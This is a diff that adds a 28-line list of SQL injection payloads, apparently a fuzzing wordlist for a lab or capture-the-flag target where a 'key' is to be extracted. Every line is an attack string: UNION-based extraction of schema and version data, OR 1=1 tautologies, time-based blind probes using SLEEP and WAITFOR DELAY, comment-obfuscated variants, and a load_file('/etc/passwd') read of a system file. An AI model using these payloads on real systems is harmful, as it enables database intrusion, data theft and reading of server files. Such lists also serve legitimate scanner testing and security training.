@@ -1,0 +1,28 @@
+' UNION SELECT 'key' --
+' UNION SELECT 'secret' --
+' UNION SELECT '123456' --
+' UNION SELECT NULL --
+' UNION SELECT 'key' FROM sqlite_master --
+' UNION SELECT 'admin' --
+' UNION SELECT 'public_key' --
+' OR 1=1 --
+' AND 1=1 --
+' AND 1=2 UNION SELECT 'key' --
+'; SELECT 'key' --
+' UNION SELECT group_concat(sql) FROM sqlite_master --
+' UNION SELECT version() --
+' UNION SELECT load_file('/etc/passwd') --
+' UNION SELECT 'key' WHERE '1'='1
+' UNION SELECT table_name FROM information_schema.tables --
+' UNION SELECT column_name FROM information_schema.columns --
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --
+' WAITFOR DELAY '0:0:5' --
+' OR '1'='1' /* 
+' OR '1'='1' -- 
+'/*!50000 UNION SELECT 'key'*/ --
+' UNION SELECT @@version --
+' UNION SELECT NULL,NULL --
+' UNION SELECT NULL,NULL,NULL --
+' AND 1=0 UNION SELECT 'key' --
+' AND EXISTS(SELECT * FROM users) --
+' AND (SELECT COUNT(*) FROM users)>0 --
